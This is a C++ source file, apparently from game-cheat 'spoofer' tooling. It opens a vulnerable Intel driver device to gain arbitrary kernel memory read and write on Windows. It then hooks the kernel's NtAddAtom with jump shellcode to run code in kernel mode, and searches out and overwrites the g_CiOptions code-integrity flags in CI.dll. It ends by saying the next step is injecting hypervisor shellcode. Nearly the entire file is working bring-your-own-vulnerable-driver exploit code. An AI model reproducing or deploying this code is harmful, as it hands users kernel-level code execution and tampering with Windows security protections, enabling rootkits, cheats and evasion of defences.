„r// HypervisorLauncher.cpp
// ALL-IN-ONE EXE - Launches hypervisor using Intel driver
// NO separate .sys file needed!
// Uses Intel driver to execute code in kernel mode

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")

// Intel driver IOCTLs - EXACT SAME AS CIPATCHER
#define IOCTL_INTEL_COPY 0x80862007
#define INTEL_CASE_VIRT_TO_PHYS 0x25
#define INTEL_CASE_MAP_PHYSICAL 0x19
#define INTEL_CASE_COPY 0x33

typedef struct _INTEL_COPY_MEMORY {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} INTEL_COPY_MEMORY;

typedef struct _INTEL_VIRT_TO_PHYS {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} INTEL_VIRT_TO_PHYS;

typedef struct _INTEL_MAP_PHYS {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} INTEL_MAP_PHYS;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI NtAddAtom(PVOID, ULONG, PUSHORT);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

// ==================== Intel Driver Functions ====================

bool ReadKernelMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, size);

  INTEL_COPY_MEMORY info = {0};
  info.case_number = 0x33;
  info.source = address;
  info.destination = (uint64_t)pinnedBuffer;
  info.length = size;

  DWORD bytesReturned = 0;
  BOOL result = DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                                nullptr, 0, &bytesReturned, nullptr);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, size);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result != FALSE;
}

bool WriteKernelMemory(uint64_t address, void *buffer, uint64_t size) {
  INTEL_VIRT_TO_PHYS vtop = {0};
  vtop.case_number = INTEL_CASE_VIRT_TO_PHYS;
  vtop.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &vtop, sizeof(vtop), &vtop,
                       sizeof(vtop), &bytesReturned, nullptr)) {
    return false;
  }

  uint64_t physAddr = vtop.return_physical_address;
  if (physAddr == 0)
    return false;

  INTEL_MAP_PHYS mapInfo = {0};
  mapInfo.case_number = INTEL_CASE_MAP_PHYSICAL;
  mapInfo.physical_address_to_map = physAddr & ~0xFFFULL;
  mapInfo.size = 0x1000;

  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &mapInfo, sizeof(mapInfo),
                       &mapInfo, sizeof(mapInfo), &bytesReturned, nullptr)) {
    // Fallback: direct copy
    void *pinnedBuffer =
        VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pinnedBuffer)
      return false;
    memcpy(pinnedBuffer, buffer, size);
    VirtualLock(pinnedBuffer, size);

    INTEL_COPY_MEMORY copyInfo = {0};
    copyInfo.case_number = INTEL_CASE_COPY;
    copyInfo.source = (uint64_t)pinnedBuffer;
    copyInfo.destination = address;
    copyInfo.length = size;

    BOOL result =
        DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &copyInfo, sizeof(copyInfo),
                        nullptr, 0, &bytesReturned, nullptr);
    VirtualUnlock(pinnedBuffer, size);
    VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
    return result != FALSE;
  }

  if (mapInfo.return_virtual_address == 0)
    return false;

  uint64_t pageOffset = address & 0xFFF;
  uint64_t targetAddr = mapInfo.return_virtual_address + pageOffset;

  void *pinnedBuffer =
      VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, size);

  INTEL_COPY_MEMORY copyInfo = {0};
  copyInfo.case_number = INTEL_CASE_COPY;
  copyInfo.source = (uint64_t)pinnedBuffer;
  copyInfo.destination = targetAddr;
  copyInfo.length = size;

  BOOL result =
      DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &copyInfo, sizeof(copyInfo),
                      nullptr, 0, &bytesReturned, nullptr);
  VirtualUnlock(pinnedBuffer, size);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result != FALSE;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);

  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!ReadKernelMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!ReadKernelMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                        sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, exportSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!ReadKernelMemory(moduleBase + exportRva, exportData, exportSize)) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames; i++) {
    char *funcName = (char *)(nameTable[i] + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }

  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== Kernel Function Calling ====================

// Shellcode: mov rax, <addr>; jmp rax
uint8_t jumpShellcode[] = {
    0x48, 0xB8, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <addr>
    0xFF, 0xE0                    // jmp rax
};

uint8_t originalNtAddAtom[sizeof(jumpShellcode)];

bool CallKernelFunction(uint64_t functionAddr, uint64_t *result = nullptr) {
  if (!functionAddr || !kernelNtAddAtom)
    return false;

  // Read original bytes
  if (!ReadKernelMemory(kernelNtAddAtom, originalNtAddAtom,
                        sizeof(originalNtAddAtom))) {
    printf("[-] Failed to read NtAddAtom\n");
    return false;
  }

  // Create hook
  uint8_t hook[sizeof(jumpShellcode)];
  memcpy(hook, jumpShellcode, sizeof(hook));
  *(uint64_t *)&hook[2] = functionAddr;

  // Write hook
  if (!WriteKernelMemory(kernelNtAddAtom, hook, sizeof(hook))) {
    printf("[-] Failed to hook NtAddAtom\n");
    return false;
  }

  printf("[*] NtAddAtom hooked -> 0x%llX\n", functionAddr);

  // Call NtAddAtom (triggers our code in kernel!)
  USHORT atom = 0;
  NTSTATUS status = NtAddAtom(nullptr, 0, &atom);

  printf("[*] NtAddAtom returned: 0x%X\n", status);

  // Restore original
  WriteKernelMemory(kernelNtAddAtom, originalNtAddAtom,
                    sizeof(originalNtAddAtom));
  printf("[*] NtAddAtom restored\n");

  if (result)
    *result = (uint64_t)status;
  return true;
}

// ==================== g_CiOptions Patching ====================

#define CI_ENABLED 0x01
#define CI_HVCI 0x100

uint64_t FindCiOptions(uint64_t ciBase, uint32_t ciSize) {
  uint64_t totalSize = min((uint64_t)ciSize, 0x80000ULL);
  uint8_t *buffer = (uint8_t *)malloc(totalSize);
  if (!buffer)
    return 0;

  for (uint64_t offset = 0; offset < totalSize; offset += 0x1000) {
    if (!ReadKernelMemory(ciBase + offset, buffer + offset, 0x1000)) {
      totalSize = offset;
      break;
    }
  }

  if (totalSize < 0x1000) {
    free(buffer);
    return 0;
  }

  IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)buffer;
  if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
    free(buffer);
    return 0;
  }

  IMAGE_NT_HEADERS64 *ntHeaders =
      (IMAGE_NT_HEADERS64 *)(buffer + dosHeader->e_lfanew);
  IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(ntHeaders);

  uint64_t dataStart = 0, dataSize = 0;
  for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
    if (memcmp(sections[i].Name, ".data", 5) == 0) {
      dataStart = sections[i].VirtualAddress;
      dataSize = sections[i].Misc.VirtualSize;
      break;
    }
  }

  if (dataStart == 0) {
    free(buffer);
    return 0;
  }

  uint64_t result = 0;
  for (uint64_t i = dataStart; i < dataStart + dataSize && i < totalSize - 4;
       i += 4) {
    uint32_t value = *(uint32_t *)(buffer + i);
    if ((value & CI_ENABLED) && value < 0x1000 && (value & 0xFFFF0000) == 0) {
      result = ciBase + i;
      break;
    }
  }

  free(buffer);
  return result;
}

// ==================== AMD-V/SVM Check ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckSvmSupport() {
  int regs[4];
  __cpuid(regs, 0x80000001);
  return (regs[2] & (1 << 2)) != 0; // SVM bit
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       HYPERVISOR LAUNCHER v2 (Intel Driver + Kernel Call)     \n");
  printf("    Patches HVCI + Can execute code in kernel via hook!        \n");
  printf(
      "================================================================\n\n");

  // CPU Check
  printf("=== CPU Check ===\n");
  if (!CheckAmdCpu()) {
    printf("[-] Not AMD CPU! Need AMD for SVM.\n");
    return 1;
  }
  printf("[+] AMD CPU detected\n");

  if (!CheckSvmSupport()) {
    printf("[-] SVM not supported!\n");
    return 1;
  }
  printf("[+] SVM supported!\n");

  // Open Intel driver
  printf("\n=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Failed to open Intel driver!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  // Get kernel base
  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] Failed to find ntoskrnl.exe!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl.exe: 0x%llX\n", ntoskrnlBase);

  // Find NtAddAtom for kernel function calling
  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (kernelNtAddAtom) {
    printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);
  } else {
    printf("[!] NtAddAtom not found - kernel calls disabled\n");
  }

  // Patch g_CiOptions
  printf("\n=== Patching g_CiOptions ===\n");
  uint32_t ciSize = 0;
  uint64_t ciBase = GetKernelModuleBase("CI.dll", &ciSize);
  if (ciBase) {
    printf("[+] CI.dll: 0x%llX\n", ciBase);
    uint64_t gCiOptions = FindCiOptions(ciBase, ciSize);
    if (gCiOptions) {
      uint32_t currentVal = 0;
      ReadKernelMemory(gCiOptions, &currentVal, sizeof(currentVal));
      printf("[*] g_CiOptions @ 0x%llX = 0x%X\n", gCiOptions, currentVal);

      if (!(currentVal & CI_HVCI)) {
        uint32_t newVal = currentVal | CI_HVCI;
        if (WriteKernelMemory(gCiOptions, &newVal, sizeof(newVal))) {
          printf("[+] Patched to 0x%X (HVCI enabled!)\n", newVal);
        }
      } else {
        printf("[*] HVCI flag already set\n");
      }
    }
  }

  // Find kernel functions we need
  printf("\n=== Kernel Exports ===\n");
  uint64_t exAllocPool = GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
  uint64_t mmGetPhys = GetKernelExport(ntoskrnlBase, "MmGetPhysicalAddress");

  if (exAllocPool)
    printf("[+] ExAllocatePoolWithTag: 0x%llX\n", exAllocPool);
  if (mmGetPhys)
    printf("[+] MmGetPhysicalAddress: 0x%llX\n", mmGetPhys);

  // Summary
  printf(
      "\n================================================================\n");
  printf("READY FOR HYPERVISOR!\n\n");
  printf("What we have:\n");
  printf("  [x] Intel driver for kernel R/W\n");
  printf("  [x] g_CiOptions HVCI flag patched\n");
  printf("  [x] NtAddAtom address (for kernel code execution)\n");
  printf("  [x] ExAllocatePoolWithTag (for kernel allocation)\n");
  printf("\nNEXT STEP: Write hypervisor init shellcode and execute via hook\n");
  printf("================================================================\n");

  CloseHandle(hDevice);
  return 0;
}
„r28file:///c:/inject/Spoofers/legacy/HypervisorLauncher.cpp